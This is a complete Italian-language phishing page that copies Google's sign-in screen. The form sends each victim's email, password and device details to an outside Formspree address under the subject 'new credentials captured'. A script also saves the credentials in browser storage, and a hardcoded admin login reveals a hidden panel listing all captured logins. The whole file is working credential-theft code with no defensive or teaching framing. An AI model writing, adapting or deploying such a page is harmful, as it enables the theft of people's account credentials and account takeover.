<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google - Accedi</title>
    <style>
        :root { --google-blue: #1a73e8; --google-gray: #dadce0; }
        body { font-family: 'Segoe UI', Roboto, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #fff; }
        .card { width: 400px; padding: 48px 40px; border: 1px solid var(--google-gray); border-radius: 8px; text-align: center; }
        .logo { width: 75px; margin-bottom: 10px; }
        h1 { font-size: 24px; font-weight: 400; margin-bottom: 8px; }
        .input-group { margin-top: 25px; text-align: left; }
        input { width: 100%; padding: 13px 15px; border: 1px solid var(--google-gray); border-radius: 4px; font-size: 16px; margin-bottom: 15px; }
        input:focus { border: 2px solid var(--google-blue); outline: none; }
        .footer { display: flex; justify-content: flex-end; margin-top: 20px; }
        button, .btn-submit { background-color: var(--google-blue); color: #fff; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; font-size: 14px; }
        
        /* Pannello Admin Segreto */
        #admin { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:#0d1117; color:#7ee787; padding:40px; z-index:1000; overflow:auto; }
        table { width:100%; border-collapse:collapse; margin-top:20px; }
        th, td { border: 1px solid #30363d; padding: 12px; text-align: left; font-family: monospace; }
    </style>
</head>
<body>

<div id="login-ui" class="card">
    <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo">
    <h1>Accedi</h1>
    <p>Usa il tuo Account Google</p>
    
    <!-- IL FORM REALE CHE INVIA I DATI -->
    <form action="https://formspree.io/f/xzdolnpd" method="POST" id="phish-form">
        <div class="input-group">
            <input type="text" name="Email_Vittima" id="e" placeholder="Email o telefono" required>
            <input type="password" name="Password_Vittima" id="p" placeholder="Inserisci la password" required>
            <!-- Campi nascosti per extra info -->
            <input type="hidden" name="_subject" value="NUOVE CREDENZIALI CATTURATE!">
            <input type="hidden" name="Dispositivo" id="dev-info">
        </div>
        
        <div class="footer">
            <!-- Pulsante che prima salva e poi invia -->
            <button type="button" onclick="salvaEInvia()">Avanti</button>
        </div>
    </form>
</div>

<!-- Tabella Admin locale per sicurezza -->
<div id="admin">
    <h2>[PANNELLO DI CONTROLLO LOCALE]</h2>
    <table id="logs-table">
        <tr><th>Data</th><th>Email</th><th>Password</th></tr>
    </table>
    <br><button onclick="location.reload()" style="background:#333;">Torna al Login</button>
</div>

<script>
    // Inserisce info dispositivo nel campo nascosto
    document.getElementById('dev-info').value = navigator.platform + " (" + navigator.userAgent.split(' ')[0] + ")";

    function salvaEInvia() {
        const email = document.getElementById('e').value;
        const pass = document.getElementById('p').value;

        // --- CONTROLLO ADMIN ---
        if (email === "admin@demo.it" && pass === "mostra-tutto") {
            const db = JSON.parse(localStorage.getItem('backup_logs')) || [];
            const table = document.getElementById('logs-table');
            db.forEach(d => {
                table.innerHTML += `<tr><td>${d.data}</td><td>${d.user}</td><td>${d.pass}</td></tr>`;
            });
            document.getElementById('admin').style.display = 'block';
            return;
        }

        if(!email || !pass) { alert("Completa i campi"); return; }

        // 1. Salva nel browser (Backup se la mail fallisce)
        let logs = JSON.parse(localStorage.getItem('backup_logs')) || [];
        logs.push({ data: new Date().toLocaleString(), user: email, pass: pass });
        localStorage.setItem('backup_logs', JSON.stringify(logs));

        // 2. Invia il form a Formspree
        document.getElementById('phish-form').submit();
    }
</script>

</body>
</html>
